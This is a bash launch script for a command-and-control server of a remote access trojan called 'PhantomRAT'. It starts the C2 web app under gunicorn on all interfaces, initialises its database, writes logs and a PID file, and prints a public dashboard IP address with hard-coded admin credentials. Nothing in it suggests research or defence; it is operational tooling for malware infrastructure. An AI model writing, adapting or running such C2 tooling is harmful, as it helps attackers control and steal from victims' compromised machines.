#!/bin/bash
# Start PhantomRAT C2 with Gunicorn

cd /home/sysmaint/PhantomRat

# Kill any existing instances
pkill -f gunicorn 2>/dev/null
sleep 2

# Initialize database if needed
if [ ! -f phantom_c2.db ]; then
    echo "[*] Initializing database..."
    python3 phantomrat_c2.py --init
fi

echo "[*] Starting PhantomRAT C2 with Gunicorn..."
echo "[*] Workers: $(($(nproc) * 2 + 1))"
echo "[*] Binding: 0.0.0.0:8000"

# Start gunicorn
/usr/local/bin/gunicorn \
    --bind 0.0.0.0:8000 \
    --workers $(($(nproc) * 2 + 1)) \
    --threads 2 \
    --timeout 60 \
    --access-logfile /home/sysmaint/PhantomRat/access.log \
    --error-logfile /home/sysmaint/PhantomRat/error.log \
    --log-level warning \
    --name phantomrat_c2 \
    --user sysmaint \
    --group sysmaint \
    phantomrat_c2:app &

GUNICORN_PID=$!
echo $GUNICORN_PID > /home/sysmaint/PhantomRat/gunicorn.pid

echo "[*] Gunicorn started with PID: $GUNICORN_PID"
echo "[*] Logs:"
echo "     Access: /home/sysmaint/PhantomRat/access.log"
echo "     Error:  /home/sysmaint/PhantomRat/error.log"

# Wait a moment and verify
sleep 3
if curl -s http://127.0.0.1:8000 > /dev/null; then
    echo "✅ C2 Server is running!"
    echo "📊 Dashboard: http://141.105.71.196:8000"
    echo "🔑 Login: admin / phantom123"
else
    echo "❌ Failed to start C2 Server"
    tail -n 20 /home/sysmaint/PhantomRat/error.log
fi
